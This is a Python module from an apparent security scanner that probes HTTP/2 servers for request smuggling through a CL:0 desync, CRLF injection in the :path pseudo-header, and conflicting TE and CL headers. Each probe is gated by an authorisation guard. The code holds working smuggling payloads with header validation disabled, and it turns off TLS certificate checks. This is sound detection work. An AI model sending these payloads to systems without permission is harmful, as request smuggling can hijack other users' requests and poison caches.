"""H2 tier-2 probes: CL:0 desync, :path CRLF injection, header tolerance.

Tier-2 §6. Extends the base http2_probe.py (H2.CL / H2.TE) with:

  - CL:0 smuggling: header declares Content-Length: 0 while DATA frames
    follow. A backend that honours CL:0 over h2 will treat subsequent bytes
    as the start of a new request.
  - :path CRLF injection: CRLF inside the :path pseudo-header. If the edge
    converts h2 to h1 by writing the path bytes verbatim, the h1 backend
    parses a smuggled request.
  - Header tolerance: empty names, colons in names, pseudo after regular
    headers. Strict parsers reject; lenient ones accept.

Everything routes through a controlled h2 client built on h2.connection
with outbound validation disabled — that is required to send the exact
malformed bytes the probes exist to test. ROE is enforced per probe.
"""
from __future__ import annotations

import socket
import ssl
import time
from urllib.parse import urlparse

from .config import load_engine
from .roe_guard import ROEGuard, ROEViolation

try:
    import h2.connection
    import h2.config
    import h2.events
    HAS_H2 = True
except ImportError:
    HAS_H2 = False


def _verify_tls():
    try:
        cfg = load_engine() or {}
        return bool(cfg.get("http", {}).get("verify_tls", True))
    except Exception:
        return True


def _roe_block(guard, url, method="GET"):
    if guard is None:
        try:
            guard = ROEGuard(engine_cfg=load_engine())
        except Exception as e:
            return "ROE guard unavailable (fail-closed): %s" % e
    try:
        guard.check_url(url, method)
        return None
    except ROEViolation as e:
        return str(e)


def _connect(url, timeout, roe_guard=None):
    viol = _roe_block(roe_guard, url, "GET")
    if viol:
        return None, "ROE_BLOCK: " + viol
    parsed = urlparse(url)
    host = parsed.hostname or ""
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_tls = parsed.scheme == "https"
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2"])
            sock = ctx.wrap_socket(sock, server_hostname=host)
            if sock.selected_alpn_protocol() != "h2":
                try:
                    sock.close()
                except Exception:
                    pass
                return None, "server did not negotiate h2"
        return sock, None
    except Exception as e:
        return None, "%s: %s" % (type(e).__name__, e)


def _h2_send(url, headers_bytes, body, timeout=6, verify=None, roe_guard=None):
    """Send headers_bytes [(name_b, value_b)] + body over h2; read response.

    headers_bytes must include :method, :authority, :scheme, :path.
    Returns {ok, status, body_len, error}.
    """
    if not HAS_H2:
        return {"ok": False, "error": "h2 library not installed"}
    if verify is None:
        verify = _verify_tls()
    sock, err = _connect(url, timeout, roe_guard=roe_guard)
    if err:
        return {"ok": False, "error": err, "blocked": "ROE_BLOCK" in err}
    try:
        cfg = h2.config.H2Configuration(
            client_side=True,
            validate_outbound_headers=False,
            normalize_outbound_headers=False,
        )
        conn = h2.connection.H2Connection(config=cfg)
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())
        sid = conn.get_next_available_stream_id()
        conn.send_headers(sid, headers_bytes, end_stream=(len(body) == 0))
        if body:
            conn.send_data(sid, body, end_stream=True)
        sock.sendall(conn.data_to_send())
        sock.settimeout(timeout)
        status = None
        body_len = 0
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            try:
                data = sock.recv(65535)
            except socket.timeout:
                break
            if not data:
                break
            try:
                events = conn.receive_data(data)
            except Exception as e:
                # h2 raises InvalidBodyLengthError when the server
                # sends a stream the client-side parser considers
                # malformed. If we already captured a status, use
                # it — the response arrived, this is post-hoc noise.
                if status is not None:
                    try:
                        status_i = int(status)
                    except (TypeError, ValueError):
                        status_i = None
                    return {"ok": True, "status": status_i,
                            "body_len": body_len,
                            "recv_error": "%s: %s" % (type(e).__name__, e)}
                return {"ok": False, "error": "h2 recv: %s" % e}
            for ev in events:
                if isinstance(ev, h2.events.ResponseReceived):
                    hd = dict(ev.headers)
                    status = hd.get(b":status") or hd.get(":status")
                elif isinstance(ev, h2.events.DataReceived):
                    body_len += len(ev.data)
                    conn.acknowledge_received_data(
                        ev.flow_controlled_length, ev.stream_id)
                elif isinstance(ev, (h2.events.StreamEnded,
                                      h2.events.StreamReset)):
                    try:
                        status_i = int(status) if status else None
                    except (TypeError, ValueError):
                        status_i = None
                    return {"ok": True, "status": status_i,
                            "body_len": body_len}
        try:
            status_i = int(status) if status else None
        except (TypeError, ValueError):
            status_i = None
        return {"ok": True, "status": status_i, "body_len": body_len}
    except Exception as e:
        return {"ok": False, "error": "%s: %s" % (type(e).__name__, e)}
    finally:
        try:
            sock.close()
        except Exception:
            pass


def _host_path(url):
    parsed = urlparse(url)
    host = parsed.hostname or ""
    port = parsed.port
    if port and port not in (80, 443):
        authority = "%s:%d" % (host, port)
    else:
        authority = host
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    scheme = "https" if parsed.scheme == "https" else "http"
    return authority, path, scheme


def probe_cl_zero(url, timeout=6, roe_guard=None):
    """CL:0 header with a non-empty DATA body."""
    authority, path, scheme = _host_path(url)
    smuggled = b"GET /smuggled-cl-zero HTTP/1.1\r\nHost: probe\r\n\r\n"
    headers = [
        (b":method", b"POST"),
        (b":authority", authority.encode()),
        (b":scheme", scheme.encode()),
        (b":path", path.encode()),
        (b"content-length", b"0"),
    ]
    r = _h2_send(url, headers, smuggled, timeout=timeout, roe_guard=roe_guard)
    if r.get("blocked"):
        return {"verdict": "UNKNOWN", "reason": r["error"], "evidence": r}
    if not r.get("ok"):
        return {"verdict": "UNKNOWN",
                "reason": "h2 probe failed: %s" % r.get("error"),
                "evidence": r}
    status = r.get("status")
    if status == 200:
        return {"verdict": "SUSPICIOUS",
                "reason": "target accepted CL:0 with DATA body over h2 "
                          "(potential CL.0 desync)",
                "evidence": r}
    if status in (400, 413, 431, 501):
        return {"verdict": "PASS",
                "reason": "target rejected CL:0 with body (HTTP %s)" % status,
                "evidence": r}
    return {"verdict": "PASS",
            "reason": "target responded HTTP %s to CL:0 with body" % status,
            "evidence": r}


def probe_path_crlf(url, timeout=6, roe_guard=None):
    """CRLF injection inside :path pseudo-header."""
    authority, base_path, scheme = _host_path(url)
    inject_host = authority.split(":")[0] or "probe"
    crlf_path = (
        base_path + " HTTP/1.1\r\nHost: " + inject_host
        + "\r\nX-Smuggled: 1\r\n\r\nGET /smuggled-path-crlf"
    )
    headers = [
        (b":method", b"GET"),
        (b":authority", authority.encode()),
        (b":scheme", scheme.encode()),
        (b":path", crlf_path.encode("latin-1")),
    ]
    r = _h2_send(url, headers, b"", timeout=timeout, roe_guard=roe_guard)
    if r.get("blocked"):
        return {"verdict": "UNKNOWN", "reason": r["error"], "evidence": r}
    if not r.get("ok"):
        return {"verdict": "UNKNOWN",
                "reason": "h2 probe failed: %s" % r.get("error"),
                "evidence": r}
    status = r.get("status")
    if status == 200:
        return {"verdict": "VULNERABLE",
                "reason": "target accepted a CRLF-containing :path over h2 "
                          "(potential h2->h1 request smuggling)",
                "evidence": r}
    if status in (400, 404, 501):
        return {"verdict": "PASS",
                "reason": "target rejected CRLF :path (HTTP %s)" % status,
                "evidence": r}
    return {"verdict": "PASS",
            "reason": "target responded HTTP %s to CRLF :path" % status,
            "evidence": r}


def probe_te_override(url, timeout=6, roe_guard=None):
    """Send both TE and CL headers over h2 (protocol violation)."""
    authority, path, scheme = _host_path(url)
    headers = [
        (b":method", b"POST"),
        (b":authority", authority.encode()),
        (b":scheme", scheme.encode()),
        (b":path", path.encode()),
        (b"content-length", b"5"),
        (b"transfer-encoding", b"chunked"),
    ]
    r = _h2_send(url, headers, b"0\r\n\r\n", timeout=timeout,
                 roe_guard=roe_guard)
    if r.get("blocked"):
        return {"verdict": "UNKNOWN", "reason": r["error"], "evidence": r}
    if not r.get("ok"):
        return {"verdict": "UNKNOWN",
                "reason": "h2 probe failed: %s" % r.get("error"),
                "evidence": r}
    status = r.get("status")
    if status == 200:
        return {"verdict": "SUSPICIOUS",
                "reason": "target accepted TE+CL over h2 (protocol violation)",
                "evidence": r}
    return {"verdict": "PASS",
            "reason": "target rejected TE+CL over h2 (HTTP %s)" % status,
            "evidence": r}


def _probe_h2_desync_variants():
    """Return the fixed probe spec list (unit-testable)."""
    return [
        {"id": "cl_zero", "method": "POST",
         "extra_headers": {"content-length": "0"},
         "body": b"GET /smuggled-cl-zero HTTP/1.1\r\nHost: probe\r\n\r\n",
         "probe_fn": probe_cl_zero},
        {"id": "path_crlf", "method": "GET",
         "extra_headers": {":path_injection": True},
         "body": b"",
         "probe_fn": probe_path_crlf},
        {"id": "te_cl", "method": "POST",
         "extra_headers": {"content-length": "5",
                            "transfer-encoding": "chunked"},
         "body": b"0\r\n\r\n",
         "probe_fn": probe_te_override},
    ]


def scan(target_url, timeout=6, roe_guard=None, probes=None):
    if not HAS_H2:
        return {"verdict": "UNKNOWN",
                "reason": "h2 library not installed",
                "evidence": {}}
    variants = _probe_h2_desync_variants()
    if probes:
        variants = [v for v in variants if v["id"] in probes]
    results = []
    for spec in variants:
        try:
            r = spec["probe_fn"](target_url, timeout=timeout,
                                  roe_guard=roe_guard)
        except Exception as e:
            r = {"verdict": "UNKNOWN",
                 "reason": "%s: %s" % (type(e).__name__, e),
                 "evidence": {}}
        r["id"] = spec["id"]
        results.append(r)
    rank = {"VULNERABLE": 3, "SUSPICIOUS": 2, "PASS": 1, "UNKNOWN": 0}
    overall = "UNKNOWN"
    for r in results:
        if rank.get(r.get("verdict"), 0) > rank.get(overall, 0):
            overall = r["verdict"]
    winners = [r for r in results if r.get("verdict") == overall]
    reason = (winners[0].get("reason") if winners
              else "no H2 tier-2 vectors completed")
    return {
        "verdict": overall,
        "reason": reason,
        "evidence": {"probes": results},
        "h2_desync": bool(overall in ("VULNERABLE", "SUSPICIOUS")),
    }
